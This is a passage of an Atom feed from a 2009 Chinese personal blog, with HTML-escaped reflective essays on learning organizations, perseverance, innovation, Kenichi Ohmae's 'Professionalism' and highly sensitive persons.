&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666666;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;学习型组织还有一个要素就是——&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 19px; font-family: -webkit-sans-serif;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666666;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;团队学习（Team Learning）：团队智慧应大于个人智慧的平均值，以做出正确的组织决策，透过集体思考和分析，找出个人弱点，强化团队向心力。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: normal; font-family: Georgia;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666666;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;要想找出个人弱点，继而改掉个人的缺点，有时候靠的就是把自己撕裂，把自己的价值观暴露的在众目睽睽之下，让烈日暴晒，让雨雪吹打。其中的一条途径就是能在一个&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: normal; font-family: Georgia;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666666;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;绿色的环境中，充分的表达出自己的观点，接受各种价值观的冲击，被不断的考验。而要做到这点，最重要的也许就是勇气和绿色的环境。勇气指的是每个参与者都勇于表达自己，把自己曝光，敢于承担一定的风险；而绿色的环境值得是对于那些敢于表达自己观点的人，这个环境不会施之以相应的惩罚。充满勇气并不是目标，目标是充分的交流。勇气和环境的绿化不但可以提高表达的概率，而且可以保持表达的持续性，降低表达所需要勇气的程度。因为两者之间是相互作用的，即勇气的提高可以作用于环境使更加绿化，而环境的绿化也可以作用于勇气使更勇敢。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666666;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666666;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;那么到底是哪边出问题了呢，怎样才能解决呢？&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 19px; font-family: '-webkit-sans-serif';&quot;&gt;&lt;span class=&quot;Apple-style-span&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666666;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;学习型组织是从组织领导人的头脑中开始的，如果要想领导建立学习型组织，在一切开始之前，领导人应该让自己变得有头脑，理解学习型组织，并能够帮助其他人获得成功，然后再开始行动。执行力很重要，但不是指“过早的执行”。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 19px; font-family: -webkit-sans-serif;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666666;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 19px; font-family: -webkit-sans-serif;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666666;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;其实如果在以前，这些想法我也许会在每天的邮件总结中发出来，但是我现在只是把它们写在私人博客中。虽然有点遗憾，不能充分的分享，但我我认为遵守自然法则是聪明的选择。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 19px; font-family: -webkit-sans-serif;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666666;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 19px; font-family: -webkit-sans-serif;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666666;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;附：&lt;/span&gt;&lt;/span&gt;&lt;a href=&quot;http://wiki.mbalib.com/wiki/%E5%AD%A6%E4%B9%A0%E5%9E%8B%E7%BB%84%E7%BB%87&quot;&gt;&lt;span class=&quot;Apple-style-span&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #cc9933;&quot;&gt;学习型组织&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666666;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;应包括的五项要素：&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;　　1、建立共同愿景（Building Shared Vision）：愿景可以凝聚公司上下的意志力，透过组织共识，大家努力的方向一致，个人也乐于奉献，为组织目标奋斗。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;　　2、团队学习（Team Learning）：团队智慧应大于个人智慧的平均值，以做出正确的组织决策，透过集体思考和分析，找出个人弱点，强化团队向心力。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;　　3、改变心智模式（Improve Mental Models）：组织的障碍，多来自于个人的旧思维，例如固执己见、本位主义，唯有透过团队学习，以及标杆学习，才能改变心智模式，有所创新。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;　　4、自我超越（Personal Mastery）：个人有意愿投入工作，专精工作技巧的专业，个人与愿景之间有种「创造性的张力」，正是自我超越的来源。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;　　5、系统思考（System Thinking）：应透过资讯搜集，掌握事件的全貌，以避免见树不见林，培养综观全局的思考能力，看清楚问题的本质，有助于清楚了解因果关系。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;　　学习是心灵的正向转换，企业如果能够顺利导入学习型组织，不只能够达致更高的组织绩效，更能够带动组织的生命力。&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>能坚持</title>
   <link href="http://hackfisher.github.com/blog/2009/02/can-persist"/>
   <updated>2009-02-15T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2009/02/can-persist</id>
   <content type="html">&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;过完年后回到工作岗位，一直提醒自己脚踏实地，做的多点，想的少点，可是写的却也变少了。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;人生如果有十步路要走，很多时候走到第三步路，第四步路的时候就会比较难走，也有很多人走到这个时候就会放弃。前段时间一直在思考，为什么boss能够把一个公司从刚开始一个人，几千块钱，慢慢的两个人，几个人，十几个人的能够撑到现在，慢慢地发展壮大？就他个人的技术水平，商业运营水平实在不敢恭维，常常做出错误的决定，目前看来，绝不是一个优秀的领导者。按照他自己的说法，他有很好的运气，我赞成，运气有时确实很重要，甚至比其他因素都更加重要。但是我觉得他有一个我们公司里其他人都比不上的优点，那就是“能坚持”，甚至不管是对是错。也许，“能坚持”就能等来足够的运气。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;有人说，万事开头难，我倒觉得其实是“开头之前”难！也就是当你面临选择，决定去做一件事情的时候，其实是很难的。比如，我大学快毕业的时候，是保研？是出国？是工作？是计算机？是金融？选择起来确实太痛苦了，因为没有目标，所以难。犹豫之中，时机慢慢丧失。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;但是，选择之后，真正“开头”的第一步并不一定就难，比如当你选择了一个方向作为目标，哪怕这样的选择没有任何理由，那么接下来的事情就很简单，只要朝着那个方向努力就可以了，而开头的东西一般很简单，所以学起来就快，不一定难。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;有时候难的不是第一步，反而是你朝目标前进了一段时间后的第三步，第四步。这个时候你将会面临什么样的境遇？首先，刚起步时快速成长的快感在这里会被卡住，因为当你深入了之后，学习来源就会变少，你所做的东西很有可能是前人没有碰过的领域，你刚刚建立起来的成长自信会遭到打击；其次，你从你身边的人们中意识到当你走完十步中的八九步的时候，要想再放弃就很难了，到达这个地步的人大多数会为去证明过去走过的那些路是有意义的而甘冒风险(即使实际上并不值得),而刚刚走到第三步的你可以放弃，还是承担风险。所以这个时候，能不能坚持就成了一个很重要的问题。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;从成本的角度来看，如果到了第三步放弃，付出成本30%，收益可能接近零，显然不划算，聪明的商人不会这么做。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;从地球的南极走到北极，只要方向没错，哪怕你像蚂蚁那样走，离目标总会越来越近，但如果犹豫不决，就可能南辕北辙，忽东忽西，永远达不到目标。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;如何才能够知道目标一定可以实现呢？不知道，但是我想除了“能坚持”，找不出别的法子了，你能吗？&lt;/span&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>酒、诗和女人</title>
   <link href="http://hackfisher.github.com/blog/2009/01/wine-poetry-girls"/>
   <updated>2009-01-19T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2009/01/wine-poetry-girls</id>
   <content type="html">&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;我最近读到一则关于诗人的笑话，说是让一个诗人远离尘世，去一个岛上过一辈子，让他挑选三件最喜欢的和他一同前往。诗人毫不犹豫地选了三样：诗、酒和女人。如果让他选择两样，他会放弃酒，如果让他只选一样，他会放弃诗。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;其实不单是诗人如此，其他一些人群同样如此，比如真正的数学家和真正的程序员，他们是这个社会中离诗人最近的一群人。只不过对于数学家和程序员来说，诗分别变成了数学问题和程序。不过诗人也好、数学家和程序员也好，首先他们都是人。女人的意思，我想是一种对爱的追求；诗，应该是对美的一种追求；而酒应该是一种入世的追求。程序员所关心的应该是代码之美，然后发现自己整天面对键盘、鼠标，感觉特焖，于是心中有火，开始想爱了；如果运气好点能够有份&quot;有意义&quot;的工作，或者是能够成为founder之类，那么就感觉为世界创造了价值，于是就完成&quot;入世&quot;了。数学也一样是美的，恨不能不吃不喝，生活在数学的虚拟世界里，遇到什么想往数学问题靠。但是久而久之，人的本性会让他们产生孤独，数学再美，却无人欣赏，没有爱。能够做到与世无争，数学就是自己的全部的数学家不是没有，少之又少，&lt;/span&gt;&lt;a href=&quot;http://baike.baidu.com/view/437087.htm&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;佩雷尔曼&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;可能算是一个，其他人或多或少有着对世俗(包括荣誉等等)和爱情的追求。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;如果要问我如何选择，我会和那位诗人做同样的选择，这种选择没有优与劣，或者说没得选。当然了，既然没有人问我这种又傻又蠢的问题，我当然酒、诗和女人三样照单全收了。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;牛年快到了，祝福看到这篇文章的XDJM，能牛上加牛，好运连连，永远不要放弃追求自己心中的诗、酒和女人。&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>要想创新，就不要让一个人做同一个任务两次</title>
   <link href="http://hackfisher.github.com/blog/2009/01/innovation-by-do-things-times"/>
   <updated>2009-01-15T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2009/01/innovation-by-do-things-times</id>
   <content type="html">&lt;pre escaped=&quot;true&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family: arial;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;今天看着我写的设计器，呆呆地凝视了好久，发现自己已经不容易想到哪些地方可以改进了，回想到刚刚碰到它的时候，感觉浑身都是毛病，觉得处处都有地方可以提高？&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;
&lt;pre escaped=&quot;true&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family: arial;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;那么，是现在的设计器达到完美的状态了吗？如果我不是犯傻的话，肯定不会这么认为，更不会觉得已经达到完美的状态了。那么为什么我不像刚接触它时有那么多想法可以去改进它呢？&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;
&lt;pre escaped=&quot;true&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family: arial;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;因为这是我做的，设计器的每个细节都是我码出来的，是我的选择。普通人都会倾向于欣赏自己做出来的东西，这也算是一种偏见和本性。抛开这个偏见不说，一件事情的完成的多数细节，就是他自己的理念，性格，思想的表现。而这些东西恰恰是一个人内在最实质的东西，所以让他继续做这个事情，也摆脱不了这些实质东西所影响的范围。&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;
&lt;pre escaped=&quot;true&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family: arial;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;所以，要想创新和提高，就不要让一个人重复完成某项任务两次，因为根据以上推论，这第二次很有可能失败，除非这个人的思想获得了实质性的飞跃。&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;
&lt;pre escaped=&quot;true&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family: arial;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;好方法有很多，让有潜力的新人做肯定比那个已经做过这个事情的老手要好，这是我的想法。&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;
</content>
 </entry>
 
 <entry>
   <title>大前研一的“专业主义”</title>
   <link href="http://hackfisher.github.com/blog/2009/01/ohmae-professionalism"/>
   <updated>2009-01-07T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2009/01/ohmae-professionalism</id>
   <content type="html">&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;前段时间读管理类的书籍，收获很大，不过最近想要收收心，从而专心学习软件开发，最近发现自己不懂的东西很多，如果面面俱到，恐怕这一生都学不完的了，于是学乖了，懂得了要专注于一个方向，这样才可能深入，有所得。&lt;/span&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;前段时间注意到了不少书，阿朱的&lt;a href=&quot;http://www.douban.com/subject/3319935/&quot;&gt;《走出软件作坊》&lt;/a&gt;，德鲁克的&lt;a href=&quot;http://www.douban.com/subject/1433346/&quot;&gt;《旁观者》&lt;/a&gt;，还有就是大前研一的这本&lt;a href=&quot;http://www.douban.com/subject/1790456/&quot;&gt;《专业主义》&lt;/a&gt;了，前两本书都没有看完，只有大前研一的这本看完了。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;我以前听说过大前研一，可是那时连他是做什么的，有什么建树却一无所知，也从未看过他的书（汗颜啊，小时候不喜欢读书，尽玩掉了）。豆瓣上对这本书的评价褒贬不一，不过我觉得这本书写的还是不错的，至少适合我的胃口。在读自己喜欢的书时，感觉像是跟知己聊天，其实本来应该是由于作者跟自己观点上的相同，导致喜欢这本书的。有些时候和作者有些观点重合，但是自己模糊不清楚，但是另外一个人却能总结归纳概括起来，最终成书，这就是差距，这种文字上的差距有时候像是表面上的功夫，与思维无关。其实不然，如果一个人能将它的思维清晰的诉诸于纸笔，那么他肯定对他所思考的问题十分透彻了，接受的大脑的训练也就更加彻底，形成一个良性循环，反作用使得思维更加敏锐。其实这就是我开始认真写博客的原因，其实用文字描述出来要比大脑的闪念获得的更多。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: 13px;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: 13px;&quot;&gt;大前研一所谓的专业跟所谓“专注”，“专一”不同，在他的眼里有着更深的含义，有时候更像是一种理念，一种主义，而之所以要提出这种主义，是因为它所带来的解决大问题综合方法的良好表现，说白了，能促进社会进步，用大钱研一自己的话说，就是“预言将自我实现”。并且，这里的专业包含两方面的含义，一个是“专”，另一个是“业”。在东方世界，人们更习惯的看中前者——“专”，因为这更多的与对公司和上司的忠诚联系在一起，但是大前研一所说的专业是整体的，“专”与“业”缺一不可。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: 13px;&quot;&gt;大前研一给专家下的定义：&lt;/span&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: center;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: 13px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666600; font-style: italic;&quot;&gt;专家要控制自己的情感，并靠理性而行动，他们不仅具备较强的专业知识和技能以及较强的伦理&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: center;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: 13px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666600; font-style: italic;&quot;&gt;观念，而且无一例外的以顾客为第一位，具有永不厌倦的好奇心和进取心，严格遵守纪律，以上&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: center;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: 13px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666600; font-style: italic;&quot;&gt;条件全部具备的人才，我们把它们称为专家。&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: left;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;;font-size: 13px;&quot;&gt;注：其实这里的顾客指的是广义的顾客，比如一个公司的服务职能部门的顾客可能就在公司内部，是那些直接一线生产的工人，但是现实情况却似乎是这些服务职能部门凭借着与公司高层更密切的关系，把自己放在了顾客的前面。&lt;/span&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: left;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: 13px;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: left;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: 13px;&quot;&gt;除此之外，大前研一还详细的论述了正真的专家必须具备的四种能力：&lt;/span&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: center;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: 13px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-style: italic;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666600;&quot;&gt;1.先见能力&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: center;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: 13px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-style: italic;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666600;&quot;&gt;2.构思能力&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: center;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: 13px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-style: italic;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666600;&quot;&gt;3.讨论的能力&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: center;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: 13px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-style: italic;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;color: #666600;&quot;&gt;4.适应矛盾的能力&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: left;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;;font-size: 13px;&quot;&gt;整本书的结构非常简单清晰，分为五章，第一章论述专业主义是什么，后面的四章依次论述了这四种必须的能力。所以整本书就围绕着“专业主义”简单而又大的话题展开讨论，从不会让读者偏离问题的核心，我非常喜欢，没有买亏掉。&lt;/span&gt;&lt;/div&gt;
&lt;div style=&quot;text-align: left;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: 13px;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>高敏者和高感觉寻求者</title>
   <link href="http://hackfisher.github.com/blog/2009/01/high-sensation-seekers"/>
   <updated>2009-01-03T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2009/01/high-sensation-seekers</id>
   <content type="html">&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;几天前，我偶然接触到两个新的心理学名词：“高敏者”和“高感觉寻求者”。我下意识的带着好奇心来了解相关的概念。了解完之后，很是兴奋，发现自己既是高敏者，也是高感觉寻求者，通过这两个概念，我发现自己从未这么深刻的理解自己的本性。因此，我有必要对我的读书笔记做一些总结。&lt;/span&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;高度敏感者，简称“高敏者”，“敏”即“敏感性”，不&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 18px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 21px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;仅意味着一种比别人能发现更多的微妙的细节、信息和刺激的倾向或者能力，而且意味着高敏者在心理上体验着更大的紧张度。这里所说的紧张度就像一台压力机器，仅仅记录我们内心的状态，也就是我们的思想和感情的压力状态。高敏者是一个相对比较新的概念，至少在现在的认识上是这样的,我自己以前从未听说过。这个概念与富有天赋、害羞胆怯、内向自省，甚至可能与迈尔斯-勃雷格斯类型的人群都有互相交叠，但是我们对高敏者性情的某些方面还是缺乏很好的理解，因此，我们对自己了解越多，我们的成长就能获得越多的力量。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 21px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 18px; -webkit-border-horizontal-spacing: 10px; -webkit-border-vertical-spacing: 10px; font-family: 宋体;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 21px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;《高敏者》一书的作者伊莱恩·阿伦医生认为，我们的高敏感性植根于神经系统中，很可能是通过遗传而得，整个人群中有20%是这种情况。&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 24px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;虽然不同的高敏者之间的敏感性或紧张性千差万别，但是，比常人更强的感觉意识无疑使高敏者们从周围世界获得的信息要多于那20%的人群，似乎80/20定律也使用于敏感者人群。高敏者们就像一加仑容量的水桶，却装了两加仑的水,所以我们也许会感觉好像快被水淹没了，而周围的人却悠然自得地游向岸边。&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 21px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;高敏感群体在很多方面都有非常敏锐的感觉，这使得他们的工作有时陷入困顿。这些敏锐的感觉可以表现为强烈的情感或灵敏的感觉意识--比如，对丝织物的精细触觉，对微弱气味的灵敏嗅觉，对细微声音的超常听觉--仿佛心灵不停地接受信息，产生丰富的想象，从而一刻得不到休息。这种对环境的过度敏感会对我们的机体产生过度的驱动，耗尽我们的能量，甚至使我们无法继续晚上或者第二天的生活。工作不如意的压力比这些日常琐事更甚，使我们的生活暗淡无光，抑郁随之而生，健康也同时受到影响。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
